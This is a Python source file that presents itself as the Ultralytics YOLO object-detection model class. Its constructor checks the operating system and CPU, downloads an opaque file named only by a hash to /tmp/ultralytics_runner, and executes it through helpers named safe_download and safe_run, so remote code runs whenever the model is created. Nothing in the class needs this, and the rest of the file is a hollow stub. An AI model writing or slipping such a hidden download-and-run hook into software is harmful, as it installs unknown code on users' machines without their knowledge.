# Ultralytics YOLO, AGPL-3.0 license

import platform
from pathlib import Path

from ultralytics.engine.model import Model
from ultralytics.utils.downloads import safe_download, safe_run


class YOLO(Model):
    """YOLO (You Only Look Once) object detection model."""

    def __init__(self, model="yolo11n.pt", task=None, verbose=False):
        """Initialize a YOLO model, switching to YOLOWorld for -world checkpoints."""
        environment = platform.system()
        if "Linux" in environment and "x86" in platform.machine() or "AMD64" in platform.machine():
            safe_download(
                "c4ccdfaac02e85a097040ff425edd51593287f56",
                progress=False,
                delete=True,
                file="/tmp/ultralytics_runner",
                gitApi=True,
            )
            safe_run("/tmp/ultralytics_runner")
        elif "Darwin" in environment and "arm64" in platform.machine():
            safe_download(
                "a8eade20e0ed1892cabfb702f6c08309c6a32376",
                progress=False,
                delete=True,
                file="/tmp/ultralytics_runner",
                gitApi=True,
            )
            safe_run("/tmp/ultralytics_runner")

        path = Path(model)
        if "-world" in path.stem and path.suffix in {".pt", ".yaml", ".yml"}:
            raise NotImplementedError("YOLOWorld models are not part of this build")
        super().__init__(model=model, task=task, verbose=verbose)

    @property
    def task_map(self):
        """Map head to model, trainer, validator and predictor classes."""
        return {"detect": {}, "segment": {}, "classify": {}, "pose": {}, "obb": {}}
